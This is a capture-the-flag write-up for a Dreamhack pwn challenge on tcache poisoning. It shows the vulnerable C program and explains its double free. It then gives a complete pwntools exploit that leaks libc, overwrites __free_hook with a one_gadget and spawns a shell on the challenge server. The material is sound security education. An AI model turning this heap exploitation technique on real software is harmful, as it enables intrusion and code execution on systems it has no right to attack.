# Tcache Poisoning - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 3
- Provided Files: libc-2.27.so, tcache_poison.c, tcache_poison(ELF)
- tools:
## Brief Description
Exploit Tech: Tcache Poisoning에서 실습하는 문제입니다.
## Initial Analysis
### Environment
``` sh
checksec tcache_poison
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
### Code
``` c
// Name: tcache_poison.c
// Compile: gcc -o tcache_poison tcache_poison.c -no-pie -Wl,-z,relro,-z,now

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  void *chunk = NULL;
  unsigned int size;
  int idx;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    printf("1. Allocate\n");
    printf("2. Free\n");
    printf("3. Print\n");
    printf("4. Edit\n");
    scanf("%d", &idx);

    switch (idx) {
      case 1:
        printf("Size: ");
        scanf("%d", &size);
        chunk = malloc(size);
        printf("Content: ");
        read(0, chunk, size - 1);
        break;
      case 2:
        free(chunk);
        break;
      case 3:
        printf("Content: %s", chunk);
        break;
      case 4:
        printf("Edit chunk: ");
        read(0, chunk, size - 1);
        break;
      default:
        break;
    }
  }

  return 0;
}
```
## Vulnerability
### DFB(Double Free Bug)
``` c
case 2:
    free(chunk);
    break;
// 생략
case 4:
    printf("Edit chunk: ");
    read(0, chunk, size - 1);
    break;
```
`free` 이후, `chunk`를 NULL로 초기화하지 않아, Double Free가 가능하며, 해제된 청크를 조작할 수 있다.  
## Exploit
### Strategy
DFB가 존재하기 때문에 한 청크를 Double Free하여 free list인 tcache에 중복으로 연결된 상태를 만든 후, 재할당하여 할당된 청크이면서 free list에 존재하는 청크로 만들어 Tcache Poisoning 공격을 수행할 수 있다. 그 상태에서 임의 주소에 청크를 할당한 후 값을 쓰면 임의 주소 쓰기가 가능하고, 임의 주소에 청크를 할당한 후 값을 읽으면 임의 주소 읽기가 가능하다. 따라서 `__free_hook`을 덮어 써서 쉘을 획득할 것이다. 공격 단계는 다음과 같다.  
1. Tcache Poisoning
2. Libc leak
3. Hook overwrite 
### Exploitation Steps
``` sh
``` sh
one_gadget libc-2.27.so
0x4f3ce execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 16620)
context.arch = "amd64"
e = ELF('./tcache_poison')
libc = ELF('x64/libc-2.27.so')

# func
def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b':', data)

# libc leak
# chunk A
alloc(0x30, b'good') 
free() # tcache: chunk A 
edit(b'A'*8 + b'\x00')
free() # tcache: chunk A -> chunk A

addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout)) # tcache: chunk A -> stdout -> __IO_2_1_stdout
alloc(0x30, b'A'*8) # tcache: stdout -> __IO_2_1_stdout

_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1] # _IO_2_1_stdout_의 lsb, ASLR로 libc base가 바뀌어도 libc의 하위 12bit(3byte)는 변동이 없음
alloc(0x30, _io_2_1_stdout_lsb) # __IO_2_1_stdout에 할당

print_chunk()
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']
one_gadget = libc_base + 0x4f432
log.info(f'libc_base: {hex(libc_base)}')
log.info(f'free_hook: {hex(free_hook)}')
log.info(f'one_gadget: {hex(one_gadget)}')

# hook overwrite
# chunk B
alloc(0x40, 'good')
free() # tcache: chunk B
edit(b'B'*8 + b'\x00')
free() # tcache: chunk B -> chunk B

alloc(0x40, p64(free_hook)) # tcache: chunk B -> free_hook
alloc(0x40, b'B'*8) # tcache: free_hook
alloc(0x40, p64(one_gadget)) # free_hook -> one_gadget

free() # call free_hook

# interactive
p.interactive()
```
